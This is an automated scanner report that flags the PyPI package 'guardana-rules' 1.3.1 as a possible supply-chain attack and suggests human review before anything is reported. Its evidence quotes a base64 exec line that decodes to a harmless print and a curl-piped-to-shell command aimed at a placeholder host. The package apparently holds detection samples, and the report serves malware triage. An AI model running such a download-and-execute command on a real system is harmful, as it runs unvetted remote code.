# Suspicious package report: `guardana-rules` 1.3.1 (pypi)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `guardana-rules` |
| Version | `1.3.1` |
| Ecosystem | pypi |
| Risk score | 100 / 100 (high) |
| Published | 2026-11-20T13:35:26Z |
| Scanned | 2026-11-22T00:19:12Z |
| Registry page | https://pypi.org/project/guardana-rules/1.3.1/ |

## Indicators

- **obfuscation** (high, +45): Code decodes or unpacks a hidden payload and executes it. (in 2 files)

  Evidence in `guardana_rules-1.3.1/tests/proving_ground.py`:

  ```text
  "exec(__import__('base64').b64decode('cHJpbnQoMSk='))\n",
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `guardana/rules/supply_chain/notebook_payload.py`:

  ```text
  "!curl -s https://setup.example.invalid/i.sh | sh\n"
  ```

- **suspicious-endpoint** (medium, +20): URL with a raw IP address instead of a hostname.

  Evidence in `guardana/rules/mcp/_samples.py`:

  ```text
  PROTECTED = "https://192.0.2.10/mcp"
  ```


## Suggested text for an upstream report

The pypi package `guardana-rules` version `1.3.1` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code decodes or unpacks a hidden payload and executes it. (in 2 files)
- Code downloads a file and then executes it or marks it executable.
- URL with a raw IP address instead of a hostname.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via the "Report project as malware" link on the project page, or security@pypi.org.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20pypi%2Fguardana-rules%401.3.1&package=pypi%2Fguardana-rules%401.3.1
